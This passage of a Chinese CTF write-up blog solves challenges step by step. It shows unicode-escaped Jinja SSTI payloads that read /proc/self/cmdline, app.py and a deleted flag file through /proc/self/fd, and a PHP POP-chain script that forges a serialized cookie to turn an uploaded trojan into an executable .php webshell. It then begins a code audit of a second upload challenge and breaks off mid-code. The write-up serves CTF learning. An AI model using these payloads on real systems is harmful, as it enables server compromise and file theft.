系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></li><li><strong><code>/proc/self</code>在使用时，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取&#x2F;proc&#x2F;self&#x2F;cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取&#x2F;proc&#x2F;self&#x2F;cmdline。</strong></li></ol></blockquote><ul><li><p>读取当前进程</p><ul><li><p>&lt;class ‘_frozen_importlib_external.FileLoader’&gt;这个类，其下有[“get_data”]方法可以读取文件。</p></li><li><p>为什么不能直接用命令cat读取呢？</p><p>因为&#x2F;proc&#x2F;self存储的是当前进程下的信息，如果使用cat命令读取的就是cat进程的信息，而不是当前进程的信息。</p></li></ul></li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/cmdline&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221008125010896-1686983099354.png" alt="image-20221008125010896"></p><ul><li>读取app.py,这里app.py也被过滤了</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;\u0061\u0070\u0070\u002e\u0070\u0079&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><p>整理一下得到的源码，发现把最重要的部分放在了注释里。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;/app/flag&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">flag = file.read()</span><br><span class="line">flag = flag[:<span class="number">42</span>]</span><br><span class="line">app.config[<span class="string">&#x27;flag&#x27;</span>] = encode(flag, <span class="string">&#x27;GQIS5EmzfZA1Ci8NslaoMxPXqrvFB7hYOkbg9y20W3&#x27;</span>, <span class="string">&#x27;xwdFqMck1vA0pl7B8WO3DrGLma4sZ2Y6ouCPEHSQVT&#x27;</span>)</span><br><span class="line">flag = os.remove(<span class="string">&quot;/app/flag&quot;</span>)</span><br></pre></td></tr></table></figure><p>可以看到flag明文是放在&#x2F;app&#x2F;flag中的，并且只进行了open操作，没有close操作。</p><blockquote><p><strong>在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></p></blockquote><p>所以我们要去读取&#x2F;proc&#x2F;self&#x2F;fd&#x2F;？,得到&#x2F;app&#x2F;flag文件</p><p>payload</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&quot;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&quot;</span>][<span class="string">&quot;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&quot;</span>][<span class="number">0</span>][<span class="string">&quot;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&quot;</span>]()[<span class="number">91</span>][<span class="string">&quot;\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061&quot;</span>](<span class="number">0</span>, <span class="string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>3是通过burp爆破得到的。</p></blockquote><p>实际上还有另一种解法，因为提示中给了flag是放在config环境变量中的，加密算法用了异或是对称加密，而且这道题没有过滤config，所以我们直接<code>&#123;&#123;config&#125;&#125;</code>拿到加密后的flag，对其进行加密就能得到flag的明文形式了。</p><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><h2 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h2><p>cookie中存在序列化内容</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">5</span>:&#123;s:<span class="number">2</span>:<span class="string">&quot;ID&quot;</span>;i:<span class="number">3</span>;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;khaz&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;email&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;123@qq.com&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">32</span>:<span class="string">&quot;202cb962ac59075b964b07152d234b70&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">79</span>:<span class="string">&quot;../upload/c47b21fcf8f0bc8b3920541abd8024fd/8052c42ab3b8aa06a3f5f788a4ddccc2.png&quot;</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><p>保存的是我们用户的信息</p></blockquote><p>信息收集得到源代码</p><p>序列化</p><p>Login::login</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#登录后，设置cookie&#123;user:base64_encode(serialize($user_info))&#125;</span></span><br><span class="line">            <span class="variable">$user_info</span>=<span class="title function_ invoke__">db</span>(<span class="string">&quot;user&quot;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;email&quot;</span>,<span class="variable">$email</span>)-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_info</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>) === <span class="variable">$user_info</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">                    <span class="variable">$cookie_data</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user_info</span>));</span><br><span class="line">                    <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="variable">$cookie_data</span>,<span class="number">3600</span>);</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;Login successful!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../home&#x27;</span>));</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Login failed!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>Profile::update_cookie</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#更换头像后，更新cookie</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;checker-&gt;profile[<span class="string">&#x27;img&#x27;</span>]=<span class="variable language_">$this</span>-&gt;img;</span><br><span class="line">        <span class="title function_ invoke__">cookie</span>(<span class="string">&quot;user&quot;</span>,<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>反序列化</p><p>Index::login_check()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$profile</span>=<span class="title function_ invoke__">cookie</span>(<span class="string">&#x27;user&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$profile</span>))&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$profile</span>));</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;profile_db=<span class="title function_ invoke__">db</span>(<span class="string">&#x27;user&#x27;</span>)-&gt;<span class="title function_ invoke__">where</span>(<span class="string">&quot;ID&quot;</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;profile[<span class="string">&#x27;ID&#x27;</span>]))-&gt;<span class="title function_ invoke__">find</span>();</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">array_diff</span>(<span class="variable">$this</span>-&gt;profile_db,<span class="variable">$this</span>-&gt;profile)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p>该函数用于检验用户是否已登录，在登录后的每个界面都要被调用。</p></blockquote><p>文件上传后的操作</p><p>经典php文件上传操作，引用菜鸟教程的gif</p><p><img src="/../images/upload-form.gif" alt="img"></p><p>最后得到的图片路径就是这样的</p><p>..&#x2F;upload&#x2F;c47b21fcf8f0bc8b3920541abd8024fd&#x2F;8052c42ab3b8aa06a3f5f788a4ddccc2.png</p><blockquote><p>因为后缀名一定是png，所以正常来说是无法利用的，但是这里存在反序列化漏洞，导致我们可以自定义文件名</p></blockquote><p>Profile::upload_img()</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">#调用Index::login_check(),检验用户是否存在</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">login_check</span>())&#123;</span><br><span class="line">                <span class="variable">$curr_url</span>=<span class="string">&quot;http://&quot;</span>.<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>].<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_NAME&#x27;</span>].<span class="string">&quot;/index&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">redirect</span>(<span class="variable">$curr_url</span>,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#对上传文件的文件名进行处理</span></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">            <span class="comment">#设置临时文件名</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename_tmp=<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="comment">#设置文件名，加上.png后缀</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename=<span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">            <span class="comment">#检验文件后缀名是否为png</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ext_check</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="comment">#获取文件大小判断是否为 图片</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">getimagesize</span>(<span class="variable">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                <span class="comment">#将临时文件复制到创建的文件中</span></span><br><span class="line">                @<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="comment">#设置图片路径</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br><span class="line">                <span class="comment">#更新头像图片</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">update_img</span>();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Forbidden type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">error</span>(<span class="string">&#x27;Unknow file type!&#x27;</span>, <span class="title function_ invoke__">url</span>(<span class="string">&#x27;../index&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>关注</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将临时文件复制到创建的文件中</span></span><br><span class="line">@<span class="title function_ invoke__">copy</span>(<span class="variable">$this</span>-&gt;filename_tmp, <span class="variable">$this</span>-&gt;filename);</span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename_tmp);</span><br><span class="line"><span class="comment">#设置图片路径</span></span><br><span class="line"><span class="variable language_">$this</span>-&gt;img=<span class="string">&quot;../upload/<span class="subst">$this</span>-&gt;upload_menu/<span class="subst">$this</span>-&gt;filename&quot;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>令filename_tmp为我们上传的木马文件路径</p><p>只要我们可以控制filename，我们就可以自定义木马文件的文件名，就可以解析木马文件</p></blockquote><p>看一下Profile类的魔术方法</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;except[<span class="variable">$name</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$name</span>&#125;&#125;(<span class="variable">$arguments</span>);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>可以得到如果触发了call方法，就可以触发get方法。因为Profile类没有name属性，而call方法中访问了这个属性。</p><p>所以我们可以构造except[$name]&#x3D;&#x3D;upload_img，就可以调用upload_img方法。</p></blockquote><p>再找一下谁能触发call方法</p><p>Register::destruct</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;registed)&#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;checker-&gt;<span class="title function_ invoke__">index</span>();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><blockquote><p>让checker为Profile类即可</p></blockquote><p>pop链</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Register</span>::<span class="variable constant_">destruct</span> → <span class="title class_">Profile</span>::<span class="variable constant_">call</span> → <span class="title class_">Profile</span>::<span class="variable constant_">get</span> → <span class="title class_">Profile</span>::<span class="variable constant_">upload_img</span></span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#要加命名空间，否则php不知道序列化哪一个类。</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">web</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$profile</span> = <span class="keyword">new</span> <span class="title class_">Profile</span>();</span><br><span class="line"><span class="variable">$profile</span>-&gt;except = [<span class="string">&#x27;index&#x27;</span> =&gt; <span class="string">&#x27;img&#x27;</span>];</span><br><span class="line"><span class="variable">$profile</span>-&gt;img = <span class="string">&quot;upload_img&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;ext = <span class="string">&quot;png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename_tmp = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.png&quot;</span>;</span><br><span class="line"><span class="variable">$profile</span>-&gt;filename = <span class="string">&quot;./upload/c47b21fcf8f0bc8b3920541abd8024fd/10fb15c77258a991b0028080a64fb42d.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$register</span> = <span class="keyword">new</span> <span class="title class_">Register</span>();</span><br><span class="line"><span class="variable">$register</span>-&gt;registed = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$register</span>-&gt;checker = <span class="variable">$profile</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$register</span>)));</span><br></pre></td></tr></table></figure><p>把得到的序列化内容放入cookie中，刷新几次，就可以发现文件名变化，木马文件生效。</p><h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><p>信息收集</p><ol><li><p>源码上传到gitub上了</p><p><img src="/../images/1583830520899-1687419234884.png" alt="img"></p><p><img src="/../images/1583830536747-1687419234885.png" alt="img"></p><p><img src="/../images/image-20220807130328561-1687419234885.png" alt="image-20220807130328561"></p></li><li><p>show.php中的提示</p><p><img src="/../images/image-20220807130405750-1687419234885.png" alt="image-20220807130405750"></p><blockquote><p>半成品，只有文件的名字被保存。</p></blockquote></li></ol><p>代码审计</p><ol><li><p>序列化入口</p><p>helper类</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$input</span>=<span class="string">&quot;file&quot;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#获得文件各种信息</span></span><br><span class="line"><span class="variable">$fileinfo</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfile</span>(<span class="variable">$input</span>);</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;title&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;title&#x27;</span>];<span class="comment">#原文件名</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;filename&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;filename&#x27;</span>];<span class="comment">#随机名</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;ext&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;ext&#x27;</span>];<span class="comment">#后缀</span></span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;path&quot;</span>] = <span class="variable">$fileinfo</span>[<span class="string">&#x27;path&#x27;</span>];<span class="comment">#路径</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#序列化存储文件的大小</span></span><br><span class="line"><span class="variable">$img_ext</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$_FILES</span>[<span class="variable">$input</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line"><span class="variable">$my_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;width&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">0</span>],<span class="string">&quot;height&quot;</span>=&gt;<span class="variable">$img_ext</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="variable">$array</span>[<span class="string">&quot;attr&quot;</span>] = <span class="title function_ invoke__">serialize</span>(<span class="variable">$my_ext</span>);</span><br><span class="line">    <span class="comment">#将文件信息插入到数据库中</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">save</span>(<span class="variable">$array</span>);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span> == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Your images is uploaded successfully. And your image&#x27;s id is <span class="subst">$id</span>.&lt;/p&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#getfile</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$info</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">#随机名</span></span><br><span class="line"><span class="variable">$basename</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">uniqid</span>()),<span class="number">9</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="comment">#处理文件后缀名</span></span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$info</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>, <span class="string">&#x27;.&#x27;</span>), <span class="number">1</span>);</span><br><span class="line"><span class="variable">$cate_exts</span> = <span class="keyword">array</span>(<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;png&quot;</span>,<span class="string">&quot;jpeg&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>,<span class="variable">$cate_exts</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;Please upload the correct image file!!!&lt;/p&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#title=文件名</span></span><br><span class="line">    <span class="variable">$title</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;title&#x27;</span>=&gt;<span class="variable">$title</span>,<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>,<span class="string">&#x27;ext&#x27;</span>=&gt;<span class="variable">$ext</span>,<span class="string">&#x27;path&#x27;</span>=&gt;<span class="variable language_">$this</span>-&gt;folder.<span class="variable">$basename</span>.<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$data</span> || !<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Something wrong!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">insert_array</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert_array</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;r00t&quot;</span>,<span class="string">&quot;pic_base&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_connect_errno</span>(<span class="variable">$con</span>)) </span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connect MySQL Fail:&quot;</span>.<span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql_fields</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$sql_val</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="comment">#处理文件各种信息</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123;</span><br><span class="line"><span class="variable">$key_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$value_temp</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$value</span>);</span><br><span class="line"><span class="variable">$sql_fields</span>[] = <span class="string">&quot;`&quot;</span>.<span class="variable">$key_temp</span>.<span class="string">&quot;`&quot;</span>;</span><br><span class="line"><span class="variable">$sql_val</span>[] = <span class="string">&quot;&#x27;&quot;</span>.<span class="variable">$value_temp</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">#insert插入文件各种信息</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO images (&quot;</span>.(<span class="title function_ invoke__">implode</span>(<span class="string">&quot;,&quot;</span>,<span class="variable">$sql_fields</span>)).<span 